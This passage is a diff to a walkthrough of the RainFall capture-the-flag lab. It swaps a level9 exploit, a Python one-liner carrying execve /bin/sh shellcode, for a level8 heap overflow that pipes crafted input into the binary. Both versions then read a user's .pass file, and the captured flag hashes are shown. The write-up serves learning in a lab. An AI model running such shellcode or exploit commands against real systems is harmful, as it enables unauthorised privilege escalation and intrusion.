@@ -110,9 +110,12 @@ The `\n` are needed to simulate the user pressing the enter key and it will also
 
 Let's run our payload:
 ```bash
-level9@RainFall:~$ ./level9 `python -c 'print("\x08\x04\xa0\x10"[::-1] + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 83 + "\x08\x04\xa0\x0c"[::-1])'`
-$ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+level8@RainFall:~$ (echo "auth "; python -c 'print("service" + "A"*16)'; echo "login"; cat) | ./level8
+(nil), (nil)
+0x804a008, (nil)
+0x804a008, 0x804a018
+cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 ```
 
 We are now level9! Let's move on to the next level.
